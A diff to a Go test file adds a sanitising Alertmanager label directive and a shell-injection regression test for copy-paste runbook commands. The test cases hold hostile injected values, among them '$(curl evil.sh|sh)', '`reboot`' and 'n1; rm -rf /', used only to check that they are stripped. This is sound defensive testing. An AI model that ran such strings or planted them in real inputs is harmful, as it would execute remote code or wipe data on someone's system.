@@ -1,9 +1,20 @@
 package main
 
 import (
+	"regexp"
 	"strings"
 	"testing"
+	"text/template"
 )
+
+// labelDirective mirrors the exact AM Go-template directive
+// substituteLabelPlaceholders emits for an allowlisted label (CL-05):
+// the label value is passed through a strip-to-safe-charset filter and
+// length-capped before it lands in a copy-paste shell fence. Kept here
+// so the pinning tests read cleanly instead of repeating the filter.
+func labelDirective(name string) string {
+	return "{{ .Labels." + name + ` | reReplaceAll "[^a-zA-Z0-9._:/-]" "" | printf "%.128s" }}`
+}
 
 // TestExtractQuickDiagnostics drives the markdown parser against the
 // shapes it actually encounters: a real runbook with the section
@@ -109,17 +120,17 @@ func TestSubstituteLabelPlaceholders(t *testing.T) {
 		in   string
 		want string
 	}{
-		{"single known label", "host=<instance>", "host={{ .Labels.instance }}"},
-		{"multiple known labels", "kubectl logs -n <namespace> <pod>", "kubectl logs -n {{ .Labels.namespace }} {{ .Labels.pod }}"},
+		{"single known label", "host=<instance>", "host=" + labelDirective("instance")},
+		{"multiple known labels", "kubectl logs -n <namespace> <pod>", "kubectl logs -n " + labelDirective("namespace") + " " + labelDirective("pod")},
 		{"unknown label passes through", "<unknown>", "<unknown>"},
-		{"mixed known and unknown", "<instance> <unknown>", "{{ .Labels.instance }} <unknown>"},
+		{"mixed known and unknown", "<instance> <unknown>", labelDirective("instance") + " <unknown>"},
 		{"uppercase is not a placeholder", "<INSTANCE>", "<INSTANCE>"},
 		{"angle brackets in shell expression untouched", "if [ $x -lt 5 ]; then echo '<5'; fi", "if [ $x -lt 5 ]; then echo '<5'; fi"},
 		{"empty input", "", ""},
 		{"no placeholders", "psql -c 'SELECT 1'", "psql -c 'SELECT 1'"},
-		{"shell comments left alone", "# <namespace> is the alert's namespace\nkubectl get pod -n <namespace>", "# <namespace> is the alert's namespace\nkubectl get pod -n {{ .Labels.namespace }}"},
-		{"SQL comments left alone", "-- <instance> comes from the alert\nSELECT * FROM pg_stat_activity WHERE host = '<instance>';", "-- <instance> comes from the alert\nSELECT * FROM pg_stat_activity WHERE host = '{{ .Labels.instance }}';"},
-		{"indented comment still skipped", "   # <pod> here\nkubectl logs <pod>", "   # <pod> here\nkubectl logs {{ .Labels.pod }}"},
+		{"shell comments left alone", "# <namespace> is the alert's namespace\nkubectl get pod -n <namespace>", "# <namespace> is the alert's namespace\nkubectl get pod -n " + labelDirective("namespace")},
+		{"SQL comments left alone", "-- <instance> comes from the alert\nSELECT * FROM pg_stat_activity WHERE host = '<instance>';", "-- <instance> comes from the alert\nSELECT * FROM pg_stat_activity WHERE host = '" + labelDirective("instance") + "';"},
+		{"indented comment still skipped", "   # <pod> here\nkubectl logs <pod>", "   # <pod> here\nkubectl logs " + labelDirective("pod")},
 	}
 
 	for _, tc := range cases {
@@ -141,11 +152,56 @@ func TestFormatQuickDiagnosticsForAlertWithPlaceholders(t *testing.T) {
 		{Lang: "bash", Code: "psql host=<instance> -c 'SELECT 1;'"},
 	}
 	got := formatQuickDiagnosticsForAlert(blocks)
-	if !strings.Contains(got, "{{ .Labels.instance }}") {
-		t.Fatalf("expected AM template directive in output, got: %s", got)
+	if !strings.Contains(got, labelDirective("instance")) {
+		t.Fatalf("expected sanitized AM template directive in output, got: %s", got)
 	}
 	if strings.Contains(got, "<instance>") {
 		t.Fatalf("expected <instance> to be replaced, but it's still present: %s", got)
+	}
+}
+
+// TestSubstitutedPlaceholderStripsShellInjection is the CL-05 regression:
+// the directive substituteLabelPlaceholders emits must, when Alertmanager
+// evaluates it against an attacker-controlled label value, strip every
+// shell metacharacter so nothing executes in the on-call engineer's shell.
+// We render the directive with Go's text/template plus a reReplaceAll func
+// matching Alertmanager's own template funcmap, then assert on the result.
+func TestSubstitutedPlaceholderStripsShellInjection(t *testing.T) {
+	// Reproduce Alertmanager's reReplaceAll (github.com/prometheus/alertmanager
+	// template funcmap) so the test evaluates the directive exactly as AM would.
+	funcs := template.FuncMap{
+		"reReplaceAll": func(pattern, repl, text string) string {
+			return regexp.MustCompile(pattern).ReplaceAllString(text, repl)
+		},
+	}
+	directive := substituteLabelPlaceholders("kubectl describe node <node>")
+
+	tmpl, err := template.New("t").Funcs(funcs).Parse(directive)
+	if err != nil {
+		t.Fatalf("directive is not a valid template (would break AM rendering): %v", err)
+	}
+
+	cases := []struct {
+		name    string
+		value   string
+		wantOut string
+	}{
+		{"command substitution", "$(curl evil.sh|sh)", "kubectl describe node curlevil.shsh"},
+		{"backtick substitution", "`reboot`", "kubectl describe node reboot"},
+		{"semicolon chaining", "n1; rm -rf /", "kubectl describe node n1rm-rf/"},
+		{"benign hostname preserved", "web-01.prod.svc:8080", "kubectl describe node web-01.prod.svc:8080"},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			var sb strings.Builder
+			data := map[string]any{"Labels": map[string]string{"node": tc.value}}
+			if err := tmpl.Execute(&sb, data); err != nil {
+				t.Fatalf("execute: %v", err)
+			}
+			if got := sb.String(); got != tc.wantOut {
+				t.Fatalf("sanitized output mismatch:\nvalue: %q\nwant:  %q\ngot:   %q", tc.value, tc.wantOut, got)
+			}
+		})
 	}
 }
 
